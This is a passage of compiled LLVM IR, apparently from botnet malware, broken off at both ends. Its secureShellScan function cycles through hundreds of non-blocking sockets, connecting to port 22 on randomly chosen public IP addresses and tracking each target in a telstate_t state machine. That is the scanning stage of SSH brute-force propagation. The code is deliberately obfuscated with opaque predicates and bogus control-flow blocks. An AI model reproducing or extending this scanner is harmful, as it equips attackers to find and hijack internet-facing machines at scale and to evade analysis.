  %3438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3437, i32 0, i32 2
  store i8 0, i8* %3438, align 8
  %3439 = load i32, i32* %2, align 4
  %3440 = sext i32 %3439 to i64
  %3441 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3440
  %3442 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3441, i32 0, i32 3
  store i8 1, i8* %3442, align 1
  br label %originalBB232

originalBB236alteredBB:                           ; preds = %originalBB236, %2839
  %3443 = load i32, i32* %2, align 4
  %3444 = sext i32 %3443 to i64
  %3445 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3444
  %3446 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3445, i32 0, i32 2
  store i8 8, i8* %3446, align 8
  br label %originalBB236

originalBB240alteredBB:                           ; preds = %originalBB240, %2867
  %3447 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %3448 = load i32, i32* %2, align 4
  %3449 = sext i32 %3448 to i64
  %3450 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3449
  %3451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3450, i32 0, i32 6
  store i32 %3447, i32* %3451, align 4
  br label %originalBB240

originalBB244alteredBB:                           ; preds = %originalBB244, %2926
  %3452 = load i32, i32* %2, align 4
  %3453 = sext i32 %3452 to i64
  %3454 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3453
  %3455 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3454, i32 0, i32 0
  %3456 = load i32, i32* %3455, align 16
  %3457 = call i32 @sclose(i32 %3456)
  %3458 = load i32, i32* %2, align 4
  %3459 = sext i32 %3458 to i64
  %3460 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3459
  %3461 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3460, i32 0, i32 2
  store i8 0, i8* %3461, align 8
  %3462 = load i32, i32* %2, align 4
  %3463 = sext i32 %3462 to i64
  %3464 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3463
  %3465 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3464, i32 0, i32 3
  store i8 1, i8* %3465, align 1
  br label %originalBB244

originalBB248alteredBB:                           ; preds = %originalBB248, %2962
  br label %originalBB248

originalBB252alteredBB:                           ; preds = %originalBB252, %2979
  br label %originalBB252
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #4

declare i32 @time(...) #3

; Function Attrs: noinline nounwind uwtable
define void @secureShellScan() #0 {
  %1 = load i32, i32* @x.65
  %2 = load i32, i32* @y.66
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca %struct.__sigset_t, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i8*, align 8
  %18 = alloca %struct.timeval, align 8
  %19 = alloca i8*, align 8
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = call i32 @getdtablesize() #2
  %23 = sdiv i32 %22, 4
  %24 = mul nsw i32 %23, 3
  store i32 %24, i32* %9, align 4
  %25 = load i32, i32* %9, align 4
  %26 = icmp sgt i32 %25, 512
  %27 = load i32, i32* @x.65
  %28 = load i32, i32* @y.66
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %26, label %35, label %36

; <label>:35:                                     ; preds = %originalBBpart2
  br label %38

; <label>:36:                                     ; preds = %originalBBpart2
  %37 = load i32, i32* %9, align 4
  br label %38

; <label>:38:                                     ; preds = %36, %35
  %39 = phi i32 [ 512, %35 ], [ %37, %36 ]
  store i32 %39, i32* %9, align 4
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %40, align 4
  %41 = call zeroext i16 @htons(i16 zeroext 22) #13
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %41, i16* %42, align 2
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %44 = getelementptr inbounds [8 x i8], [8 x i8]* %43, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 8, i32 4, i1 false)
  %45 = load i32, i32* %9, align 4
  %46 = zext i32 %45 to i64
  %47 = call i8* @llvm.stacksave()
  store i8* %47, i8** %17, align 8
  %48 = alloca %struct.telstate_t, i64 %46, align 16
  %49 = bitcast %struct.telstate_t* %48 to i8*
  %50 = load i32, i32* %9, align 4
  %51 = sext i32 %50 to i64
  %52 = mul i64 %51, 5
  call void @llvm.memset.p0i8.i64(i8* %49, i8 0, i64 %52, i32 16, i1 false)
  store i32 0, i32* %10, align 4
  br label %53

; <label>:53:                                     ; preds = %72, %38
  %54 = load i32, i32* %10, align 4
  %55 = load i32, i32* %9, align 4
  %56 = icmp slt i32 %54, %55
  br i1 %56, label %57, label %75

; <label>:57:                                     ; preds = %53
  %58 = load i32, i32* %10, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %59
  %61 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i32 0, i32 3
  store i8 1, i8* %61, align 1
  %62 = call noalias i8* @malloc(i64 1024) #2
  %63 = load i32, i32* %10, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %64
  %66 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %65, i32 0, i32 8
  store i8* %62, i8** %66, align 8
  %67 = load i32, i32* %10, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %68
  %70 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %69, i32 0, i32 8
  %71 = load i8*, i8** %70, align 8
  call void @llvm.memset.p0i8.i64(i8* %71, i8 0, i64 1024, i32 1, i1 false)
  br label %72

; <label>:72:                                     ; preds = %57
  %73 = load i32, i32* %10, align 4
  %74 = add nsw i32 %73, 1
  store i32 %74, i32* %10, align 4
  br label %53

; <label>:75:                                     ; preds = %53
  %76 = load i32, i32* @x.65
  %77 = load i32, i32* @y.66
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %75
  %84 = getelementptr inbounds %struct.timeval, %struct.timeval* %18, i32 0, i32 0
  store i64 8, i64* %84, align 8
  %85 = getelementptr inbounds %struct.timeval, %struct.timeval* %18, i32 0, i32 1
  store i64 0, i64* %85, align 8
  %86 = load i32, i32* @x.65
  %87 = load i32, i32* @y.66
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %94

; <label>:94:                                     ; preds = %2842, %originalBBpart220
  %95 = load i32, i32* @x.65
  %96 = load i32, i32* @y.66
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %94
  %103 = load i32, i32* @x.65
  %104 = load i32, i32* @y.66
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %111

; <label>:111:                                    ; preds = %originalBBpart224
  store i32 0, i32* %10, align 4
  br label %112

; <label>:112:                                    ; preds = %2839, %111
  %113 = load i32, i32* %10, align 4
  %114 = load i32, i32* %9, align 4
  %115 = icmp slt i32 %113, %114
  br i1 %115, label %116, label %2842

; <label>:116:                                    ; preds = %112
  %117 = load i32, i32* %10, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %118
  %120 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %119, i32 0, i32 2
  %121 = load i8, i8* %120, align 8
  %122 = zext i8 %121 to i32
  switch i32 %122, label %2838 [
    i32 0, label %123
    i32 1, label %362
    i32 2, label %550
    i32 3, label %755
    i32 4, label %855
    i32 5, label %1391
    i32 6, label %1491
    i32 7, label %2652
    i32 8, label %2696
    i32 9, label %2740
  ]

; <label>:123:                                    ; preds = %116
  %124 = load i32, i32* %10, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %125
  %127 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %126, i32 0, i32 8
  %128 = load i8*, i8** %127, align 8
  call void @llvm.memset.p0i8.i64(i8* %128, i8 0, i64 1024, i32 1, i1 false)
  %129 = load i32, i32* %10, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %130
  %132 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %131, i32 0, i32 3
  %133 = load i8, i8* %132, align 1
  %134 = icmp ne i8 %133, 0
  br i1 %134, label %135, label %171

; <label>:135:                                    ; preds = %123
  %136 = load i32, i32* @x.65
  %137 = load i32, i32* @y.66
  %138 = sub i32 %136, 1
  %139 = mul i32 %136, %138
  %140 = urem i32 %139, 2
  %141 = icmp eq i32 %140, 0
  %142 = icmp slt i32 %137, 10
  %143 = or i1 %141, %142
  br i1 %143, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %135
  %144 = load i32, i32* %10, align 4
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %145
  %147 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %146, i32 0, i32 8
  %148 = load i8*, i8** %147, align 8
  store i8* %148, i8** %19, align 8
  %149 = load i32, i32* %10, align 4
  %150 = sext i32 %149 to i64
  %151 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %150
  %152 = bitcast %struct.telstate_t* %151 to i8*
  call void @llvm.memset.p0i8.i64(i8* %152, i8 0, i64 32, i32 16, i1 false)
  %153 = load i8*, i8** %19, align 8
  %154 = load i32, i32* %10, align 4
  %155 = sext i32 %154 to i64
  %156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %155
  %157 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %156, i32 0, i32 8
  store i8* %153, i8** %157, align 8
  %158 = call i32 @getRandomPublicIP()
  %159 = load i32, i32* %10, align 4
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %160
  %162 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %161, i32 0, i32 1
  store i32 %158, i32* %162, align 4
  %163 = load i32, i32* @x.65
  %164 = load i32, i32* @y.66
  %165 = sub i32 %163, 1
  %166 = mul i32 %163, %165
  %167 = urem i32 %166, 2
  %168 = icmp eq i32 %167, 0
  %169 = icmp slt i32 %164, 10
  %170 = or i1 %168, %169
  br i1 %170, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %258

; <label>:171:                                    ; preds = %123
  %172 = load i32, i32* @x.65
  %173 = load i32, i32* @y.66
  %174 = sub i32 %172, 1
  %175 = mul i32 %172, %174
  %176 = urem i32 %175, 2
  %177 = icmp eq i32 %176, 0
  %178 = icmp slt i32 %173, 10
  %179 = or i1 %177, %178
  br i1 %179, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %171
  %180 = load i32, i32* %10, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %181
  %183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %182, i32 0, i32 5
  %184 = load i8, i8* %183, align 1
  %185 = add i8 %184, 1
  store i8 %185, i8* %183, align 1
  %186 = load i32, i32* %10, align 4
  %187 = sext i32 %186 to i64
  %188 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %187
  %189 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %188, i32 0, i32 5
  %190 = load i8, i8* %189, align 1
  %191 = zext i8 %190 to i64
  %192 = icmp eq i64 %191, 18
  %193 = load i32, i32* @x.65
  %194 = load i32, i32* @y.66
  %195 = sub i32 %193, 1
  %196 = mul i32 %193, %195
  %197 = urem i32 %196, 2
  %198 = icmp eq i32 %197, 0
  %199 = icmp slt i32 %194, 10
  %200 = or i1 %198, %199
  br i1 %200, label %originalBBpart238, label %originalBB30alteredBB

originalBBpart238:                                ; preds = %originalBB30
  br i1 %192, label %201, label %212

; <label>:201:                                    ; preds = %originalBBpart238
  %202 = load i32, i32* %10, align 4
  %203 = sext i32 %202 to i64
  %204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %203
  %205 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %204, i32 0, i32 5
  store i8 0, i8* %205, align 1
  %206 = load i32, i32* %10, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %207
  %209 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %208, i32 0, i32 4
  %210 = load i8, i8* %209, align 2
  %211 = add i8 %210, 1
  store i8 %211, i8* %209, align 2
  br label %212

; <label>:212:                                    ; preds = %201, %originalBBpart238
  %213 = load i32, i32* @x.65
  %214 = load i32, i32* @y.66
  %215 = sub i32 %213, 1
  %216 = mul i32 %213, %215
  %217 = urem i32 %216, 2
  %218 = icmp eq i32 %217, 0
  %219 = icmp slt i32 %214, 10
  %220 = or i1 %218, %219
  br i1 %220, label %originalBB40, label %originalBB40alteredBB

originalBB40:                                     ; preds = %originalBB40alteredBB, %212
  %221 = load i32, i32* %10, align 4
  %222 = sext i32 %221 to i64
  %223 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %222
  %224 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %223, i32 0, i32 4
  %225 = load i8, i8* %224, align 2
  %226 = zext i8 %225 to i64
  %227 = icmp eq i64 %226, 10
  %228 = load i32, i32* @x.65
  %229 = load i32, i32* @y.66
  %230 = sub i32 %228, 1
  %231 = mul i32 %228, %230
  %232 = urem i32 %231, 2
  %233 = icmp eq i32 %232, 0
  %234 = icmp slt i32 %229, 10
  %235 = or i1 %233, %234
  br i1 %235, label %originalBBpart242, label %originalBB40alteredBB

originalBBpart242:                                ; preds = %originalBB40
  br i1 %227, label %236, label %241

; <label>:236:                                    ; preds = %originalBBpart242
  %237 = load i32, i32* %10, align 4
  %238 = sext i32 %237 to i64
  %239 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %238
  %240 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %239, i32 0, i32 3
  store i8 1, i8* %240, align 1
  br label %2839

; <label>:241:                                    ; preds = %originalBBpart242
  %242 = load i32, i32* @x.65
  %243 = load i32, i32* @y.66
  %244 = sub i32 %242, 1
  %245 = mul i32 %242, %244
  %246 = urem i32 %245, 2
  %247 = icmp eq i32 %246, 0
  %248 = icmp slt i32 %243, 10
  %249 = or i1 %247, %248
  br i1 %249, label %originalBB44, label %originalBB44alteredBB

originalBB44:                                     ; preds = %originalBB44alteredBB, %241
  %250 = load i32, i32* @x.65
  %251 = load i32, i32* @y.66
  %252 = sub i32 %250, 1
  %253 = mul i32 %250, %252
  %254 = urem i32 %253, 2
  %255 = icmp eq i32 %254, 0
  %256 = icmp slt i32 %251, 10
  %257 = or i1 %255, %256
  br i1 %257, label %originalBBpart246, label %originalBB44alteredBB

originalBBpart246:                                ; preds = %originalBB44
  br label %258

; <label>:258:                                    ; preds = %originalBBpart246, %originalBBpart228
  %259 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %259, align 4
  %260 = call zeroext i16 @htons(i16 zeroext 22) #13
  %261 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %260, i16* %261, align 2
  %262 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %263 = getelementptr inbounds [8 x i8], [8 x i8]* %262, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %263, i8 0, i64 8, i32 4, i1 false)
  %264 = load i32, i32* %10, align 4
  %265 = sext i32 %264 to i64
  %266 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %265
  %267 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %266, i32 0, i32 1
  %268 = load i32, i32* %267, align 4
  %269 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %270 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %269, i32 0, i32 0
  store i32 %268, i32* %270, align 4
  %271 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %272 = load i32, i32* %10, align 4
  %273 = sext i32 %272 to i64
  %274 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %273
  %275 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %274, i32 0, i32 0
  store i32 %271, i32* %275, align 16
  %276 = load i32, i32* %10, align 4
  %277 = sext i32 %276 to i64
  %278 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %277
  %279 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %278, i32 0, i32 0
  %280 = load i32, i32* %279, align 16
  %281 = icmp eq i32 %280, -1
  br i1 %281, label %282, label %299

; <label>:282:                                    ; preds = %258
  %283 = load i32, i32* @x.65
  %284 = load i32, i32* @y.66
  %285 = sub i32 %283, 1
  %286 = mul i32 %283, %285
  %287 = urem i32 %286, 2
  %288 = icmp eq i32 %287, 0
  %289 = icmp slt i32 %284, 10
  %290 = or i1 %288, %289
  br i1 %290, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %282
  %291 = load i32, i32* @x.65
  %292 = load i32, i32* @y.66
  %293 = sub i32 %291, 1
  %294 = mul i32 %291, %293
  %295 = urem i32 %294, 2
  %296 = icmp eq i32 %295, 0
  %297 = icmp slt i32 %292, 10
  %298 = or i1 %296, %297
  br i1 %298, label %originalBBpart250, label %originalBB48alteredBB

originalBBpart250:                                ; preds = %originalBB48
  br label %2839

; <label>:299:                                    ; preds = %258
  %300 = load i32, i32* @x.65
  %301 = load i32, i32* @y.66
  %302 = sub i32 %300, 1
  %303 = mul i32 %300, %302
  %304 = urem i32 %303, 2
  %305 = icmp eq i32 %304, 0
  %306 = icmp slt i32 %301, 10
  %307 = or i1 %305, %306
  br i1 %307, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %299
  %308 = load i32, i32* %10, align 4
  %309 = sext i32 %308 to i64
  %310 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %309
  %311 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %310, i32 0, i32 0
  %312 = load i32, i32* %311, align 16
  %313 = load i32, i32* %10, align 4
  %314 = sext i32 %313 to i64
  %315 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %314
  %316 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %315, i32 0, i32 0
  %317 = load i32, i32* %316, align 16
  %318 = call i32 (i32, i32, ...) @fcntl(i32 %317, i32 3, i8* null)
  %319 = or i32 %318, 2048
  %320 = call i32 (i32, i32, ...) @fcntl(i32 %312, i32 4, i32 %319)
  %321 = load i32, i32* %10, align 4
  %322 = sext i32 %321 to i64
  %323 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %322
  %324 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %323, i32 0, i32 0
  %325 = load i32, i32* %324, align 16
  %326 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %327 = call i32 @connect(i32 %325, %struct.sockaddr* %326, i32 16)
  %328 = icmp eq i32 %327, -1
  %329 = load i32, i32* @x.65
  %330 = load i32, i32* @y.66
  %331 = sub i32 %329, 1
  %332 = mul i32 %329, %331
  %333 = urem i32 %332, 2
  %334 = icmp eq i32 %333, 0
  %335 = icmp slt i32 %330, 10
  %336 = or i1 %334, %335
  br i1 %336, label %originalBBpart256, label %originalBB52alteredBB

originalBBpart256:                                ; preds = %originalBB52
  br i1 %328, label %337, label %352

; <label>:337:                                    ; preds = %originalBBpart256
  %338 = call i32* @__errno_location() #13
  %339 = load i32, i32* %338, align 4
  %340 = icmp ne i32 %339, 115
  br i1 %340, label %341, label %352

; <label>:341:                                    ; preds = %337
  %342 = load i32, i32* %10, align 4
  %343 = sext i32 %342 to i64
  %344 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %343
  %345 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %344, i32 0, i32 0
  %346 = load i32, i32* %345, align 16
  %347 = call i32 @sclose(i32 %346)
  %348 = load i32, i32* %10, align 4
  %349 = sext i32 %348 to i64
  %350 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %349
  %351 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %350, i32 0, i32 3
  store i8 1, i8* %351, align 1
  br label %361

; <label>:352:                                    ; preds = %337, %originalBBpart256
  %353 = load i32, i32* %10, align 4
  %354 = sext i32 %353 to i64
  %355 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %354
  %356 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %355, i32 0, i32 2
  store i8 1, i8* %356, align 8
  %357 = load i32, i32* %10, align 4
  %358 = sext i32 %357 to i64
  %359 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %358
  %360 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %359, i32 0, i32 6
  store i32 0, i32* %360, align 4
  br label %361

; <label>:361:                                    ; preds = %352, %341
  br label %2838

; <label>:362:                                    ; preds = %116
  %363 = load i32, i32* %10, align 4
  %364 = sext i32 %363 to i64
  %365 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %364
  %366 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %365, i32 0, i32 6
  %367 = load i32, i32* %366, align 4
  %368 = icmp eq i32 %367, 0
  br i1 %368, label %369, label %375

; <label>:369:                                    ; preds = %362
  %370 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %371 = load i32, i32* %10, align 4
  %372 = sext i32 %371 to i64
  %373 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %372
  %374 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %373, i32 0, i32 6
  store i32 %370, i32* %374, align 4
  br label %375

; <label>:375:                                    ; preds = %369, %362
  br label %376

; <label>:376:                                    ; preds = %375
  %377 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %12, i32 0, i32 0
  %378 = getelementptr inbounds [16 x i64], [16 x i64]* %377, i64 0, i64 0
  %379 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %378) #2, !srcloc !6
  %380 = extractvalue { i64, i64* } %379, 0
  %381 = extractvalue { i64, i64* } %379, 1
  %382 = trunc i64 %380 to i32
  store i32 %382, i32* %20, align 4
  %383 = ptrtoint i64* %381 to i64
  %384 = trunc i64 %383 to i32
  store i32 %384, i32* %21, align 4
  br label %385

; <label>:385:                                    ; preds = %376
  br label %386

; <label>:386:                                    ; preds = %385
  %387 = load i32, i32* %10, align 4
  %388 = sext i32 %387 to i64
  %389 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %388
  %390 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %389, i32 0, i32 0
  %391 = load i32, i32* %390, align 16
  %392 = srem i32 %391, 64
  %393 = zext i32 %392 to i64
  %394 = shl i64 1, %393
  %395 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %12, i32 0, i32 0
  %396 = load i32, i32* %10, align 4
  %397 = sext i32 %396 to i64
  %398 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %397
  %399 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %398, i32 0, i32 0
  %400 = load i32, i32* %399, align 16
  %401 = sdiv i32 %400, 64
  %402 = sext i32 %401 to i64
  %403 = getelementptr inbounds [16 x i64], [16 x i64]* %395, i64 0, i64 %402
  %404 = load i64, i64* %403, align 8
  %405 = or i64 %404, %394
  store i64 %405, i64* %403, align 8
  %406 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %406, align 8
  %407 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 10000, i64* %407, align 8
  %408 = load i32, i32* %10, align 4
  %409 = sext i32 %408 to i64
  %410 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %409
  %411 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %410, i32 0, i32 0
  %412 = load i32, i32* %411, align 16
  %413 = add nsw i32 %412, 1
  %414 = call i32 @select(i32 %413, %struct.__sigset_t* null, %struct.__sigset_t* %12, %struct.__sigset_t* null, %struct.timeval* %13)
  store i32 %414, i32* %11, align 4
  %415 = load i32, i32* %11, align 4
  %416 = icmp eq i32 %415, 1
  br i1 %416, label %417, label %474

; <label>:417:                                    ; preds = %386
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %418 = load i32, i32* %10, align 4
  %419 = sext i32 %418 to i64
  %420 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %419
  %421 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %420, i32 0, i32 0
  %422 = load i32, i32* %421, align 16
  %423 = bitcast i32* %15 to i8*
  %424 = call i32 @getsockopt(i32 %422, i32 1, i32 4, i8* %423, i32* %14) #2
  %425 = load i32, i32* %15, align 4
  %426 = icmp ne i32 %425, 0
  br i1 %426, label %427, label %442

; <label>:427:                                    ; preds = %417
  %428 = load i32, i32* %10, align 4
  %429 = sext i32 %428 to i64
  %430 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %429
  %431 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %430, i32 0, i32 0
  %432 = load i32, i32* %431, align 16
  %433 = call i32 @sclose(i32 %432)
  %434 = load i32, i32* %10, align 4
  %435 = sext i32 %434 to i64
  %436 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %435
  %437 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %436, i32 0, i32 2
  store i8 0, i8* %437, align 8
  %438 = load i32, i32* %10, align 4
  %439 = sext i32 %438 to i64
  %440 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %439
  %441 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %440, i32 0, i32 3
  store i8 1, i8* %441, align 1
  br label %473

; <label>:442:                                    ; preds = %417
  %443 = load i32, i32* %10, align 4
  %444 = sext i32 %443 to i64
  %445 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %444
  %446 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %445, i32 0, i32 0
  %447 = load i32, i32* %446, align 16
  %448 = load i32, i32* %10, align 4
  %449 = sext i32 %448 to i64
  %450 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %449
  %451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %450, i32 0, i32 0
  %452 = load i32, i32* %451, align 16
  %453 = call i32 (i32, i32, ...) @fcntl(i32 %452, i32 3, i8* null)
  %454 = and i32 %453, -2049
  %455 = call i32 (i32, i32, ...) @fcntl(i32 %447, i32 4, i32 %454)
  %456 = load i32, i32* %10, align 4
  %457 = sext i32 %456 to i64
  %458 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %457
  %459 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %458, i32 0, i32 6
  store i32 0, i32* %459, align 4
  %460 = load i32, i32* %10, align 4
